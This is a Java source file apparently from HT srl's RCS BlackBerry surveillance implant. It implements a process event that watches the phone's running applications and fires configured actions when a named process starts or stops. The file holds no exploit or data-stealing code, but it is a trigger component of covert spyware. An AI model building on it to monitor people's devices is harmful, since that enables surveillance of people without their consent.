/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ProcessEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.util.Vector;

import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;
import net.rim.device.api.util.DataBuffer;

public class ProcessEvent extends Event implements ApplicationListObserver {
	// #debug
	private static Debug debug = new Debug("ProcessEvent", DebugLevel.VERBOSE);

	int actionOnEnter;
	int actionOnExit;

	boolean processType;
	
	String process;

	public ProcessEvent(final int actionId, final byte[] confParams) {
		super(Event.EVENT_PROCESS, actionId, confParams);
		setPeriod(NEVER);
	}

	public void actualStart() {
		// #debug debug
		debug.trace("actualStart");
		AppListener.getInstance().addApplicationListObserver(this);
	}

	public void actualStop() {
		// #debug debug
		debug.trace("actualStop");
		AppListener.getInstance().removeApplicationListObserver(this);
	}

	protected void actualRun() {
		// #debug debug
		debug.trace("actualRun");
	}

	protected boolean parse(final byte[] confParams) {
		DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length, false);
		try {
			actionOnEnter = actionId;
			actionOnExit = databuffer.readInt();

			int value = databuffer.readInt();
			processType = value == 0; // 0: process, 1: window;
			
			int len = databuffer.readInt();

			byte[] payload = new byte[len];
			databuffer.read(payload);

			process = WChar.getString(payload, true);

			// #debug info
			debug.info("Process: "+process + " enter:" + actionOnEnter + " exit: "+ actionOnExit);
			
			// #ifdef DBC
			Check.asserts(actionOnEnter >= Action.ACTION_NULL,
					"negative value Enter");
			Check.asserts(actionOnExit >= Action.ACTION_NULL,
					"negative value Exit");
			// #endif

		} catch (EOFException e) {
			return false;
		}

		return true;
	}

	public synchronized void onApplicationListChange(Vector startedList, Vector stoppedList) {

		// #debug debug
		debug.trace("onApplicationListChange: "+this);

		if (actionOnEnter != Action.ACTION_NULL && startedList.contains(process)) {
			// #debug info
			debug.info("triggering enter: " + process);		
			trigger(actionOnEnter);
		}

		if (actionOnExit != Action.ACTION_NULL && stoppedList.contains(process)) {
			// #debug info
			debug.info("triggering exit: " + process);
			trigger(actionOnExit);
		}
	}

}
